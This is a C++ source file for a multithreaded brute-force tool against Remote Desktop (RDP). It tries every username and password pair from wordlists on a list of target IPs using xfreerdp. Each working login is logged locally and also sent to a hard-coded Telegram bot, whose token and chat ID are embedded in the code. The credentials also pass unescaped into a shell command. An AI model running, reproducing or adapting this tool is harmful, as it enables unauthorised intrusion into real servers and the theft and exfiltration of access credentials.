#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <thread>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <atomic>
#include <cstdlib>
#include <cstring>
#include <curl/curl.h>

// Mutexes for thread safety
std::mutex output_mutex;
std::mutex queue_mutex;
std::condition_variable cv;
std::atomic<bool> found_valid_credentials(false);

// Telegram Bot Details
const std::string TELEGRAM_BOT_TOKEN = "7079921472:AAHcrHtlpUpRYW3fuQJk3Ha45dX15yPQDGY";
const std::string TELEGRAM_CHAT_ID = "1073690504";

// Struct to store login credentials
struct Credential {
    std::string username;
    std::string password;
};

// Struct to store target info
struct Target {
    std::string ip;
};

// Function to read file lines into a vector
std::vector<std::string> read_file(const std::string &filepath) {
    std::vector<std::string> lines;
    std::ifstream file(filepath);
    if (!file) {
        std::cerr << "Error: Cannot open file " << filepath << std::endl;
        return lines;
    }
    std::string line;
    while (std::getline(file, line)) {
        if (!line.empty()) {
            lines.push_back(line);
        }
    }
    return lines;
}

// Generate username-password combinations
std::vector<Credential> generate_combinations(const std::vector<std::string> &usernames, 
                                              const std::vector<std::string> &passwords) {
    std::vector<Credential> credentials;
    for (const auto &user : usernames) {
        for (const auto &pass : passwords) {
            credentials.push_back({user, pass});
        }
    }
    return credentials;
}

// Function to send a Telegram message
void send_telegram_message(const std::string &message) {
    std::string url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
    std::string post_data = "chat_id=" + TELEGRAM_CHAT_ID + "&text=" + message;

    CURL *curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

// Function to attempt RDP login
void try_rdp_login(const Target &target, const Credential &cred, const std::string &domain) {
    if (found_valid_credentials) return; // Stop if valid credentials are found

    std::string command = "xfreerdp /v:" + target.ip + " /u:" + cred.username + 
                          " /p:" + cred.password + " /d:" + domain + " +auth-only > /dev/null 2>&1";

    int result = std::system(command.c_str());

    std::lock_guard<std::mutex> lock(output_mutex);
    if (WIFEXITED(result) && WEXITSTATUS(result) == 0) {
        std::string success_msg = "[SUCCESS] " + target.ip + " -> " + cred.username + " / " + cred.password;
        std::cout << success_msg << std::endl;
        std::ofstream log_file("success_log.txt", std::ios::app);
        log_file << target.ip << " " << cred.username << " " << cred.password << std::endl;
        
        // Send to Telegram
        send_telegram_message(success_msg);
        
        found_valid_credentials = true;
    } else {
        std::cout << "[FAILED] " << target.ip << " -> " << cred.username << " / " << cred.password << std::endl;
    }
}

// Worker function for processing login attempts
void process_targets(std::queue<Target> &target_queue, const std::vector<Credential> &credentials, 
                     const std::string &domain) {
    while (true) {
        Target target;
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            cv.wait(lock, [&target_queue]() { return !target_queue.empty() || found_valid_credentials; });

            if (target_queue.empty() || found_valid_credentials) return;
            target = target_queue.front();
            target_queue.pop();
        }

        for (const auto &cred : credentials) {
            if (found_valid_credentials) return;
            try_rdp_login(target, cred, domain);
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <target_list> <password_list> <username_list>" << std::endl;
        return 1;
    }

    std::string target_file = argv[1];
    std::string password_file = argv[2];
    std::string username_file = argv[3];
    std::string domain = "domain";  // Default domain

    // Load targets, usernames, and passwords
    std::vector<std::string> target_ips = read_file(target_file);
    std::vector<std::string> passwords = read_file(password_file);
    std::vector<std::string> usernames = read_file(username_file);

    if (target_ips.empty() || passwords.empty() || usernames.empty()) {
        std::cerr << "Error: One or more input files are empty." << std::endl;
        return 1;
    }

    // Generate credential combinations
    std::vector<Credential> credentials = generate_combinations(usernames, passwords);
    
    std::cout << "Loaded " << target_ips.size() << " targets and " << credentials.size() << " credential pairs." << std::endl;

    // Multi-threaded brute-force execution
    const int num_threads = std::thread::hardware_concurrency() * 2;  // Increase threads dynamically
    std::queue<Target> target_queue;

    // Populate the queue
    for (const auto &ip : target_ips) {
        target_queue.push({ip});
    }

    // Start worker threads
    std::vector<std::thread> workers;
    for (int i = 0; i < num_threads; i++) {
        workers.emplace_back(process_targets, std::ref(target_queue), std::ref(credentials), domain);
    }

    // Notify workers
    cv.notify_all();

    // Wait for all threads to finish
    for (auto &worker : workers) {
        worker.join();
    }

    if (!found_valid_credentials) {
        std::cout << "No valid credentials found." << std::endl;
    } else {
        std::cout << "Check success_log.txt for valid credentials." << std::endl;
    }

    return found_valid_credentials ? 0 : 1;
}
